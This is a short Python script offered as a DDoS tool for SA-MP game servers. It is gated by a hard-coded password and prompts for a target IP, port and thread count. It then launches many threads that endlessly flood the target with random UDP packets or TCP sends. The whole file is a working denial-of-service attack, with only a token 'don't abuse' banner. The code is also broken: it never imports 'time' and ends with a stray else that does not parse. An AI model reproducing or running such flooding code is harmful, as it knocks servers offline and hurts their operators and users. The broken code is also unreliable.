import random
import socket
import threading

password = input("[•] Account :")
time.sleep(2)
if password=="VNZ":
  print("[✓] Akun  Berhasil Masuk")
  time.sleep(2)
print("--- AUTHOR BY : Vinzz ---")
print("--- TOOLS BY : VNZ COMUNITY ---")
print("--- JANGAN ABUSE YA ---")
print("===================================")
print("DDOS FOR SAMP, ULTRA - HOST, 20GTPS")
print("========== VERSION 2.0 ============")
ip = str(input(" Host Or IP:"))
port = int(input(" Port:"))
choice = str(input(" GASS UDP dek?(y/n):"))
times = int(input(" Package:"))
threads = int(input(" Threads (99999):"))
def run():
  data = random._urandom(1024)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" TEMBUS GA YAHH?")
    except:
      print("Vinzz ni Banhh!!")

def run2():
  data = random._urandom(16)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" Packet from vinzz dek!")
    except:
      s.close()
      print("[*] Mampus")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()
  else:
	print("\033[1;31;40m[!] Wrong Password!")
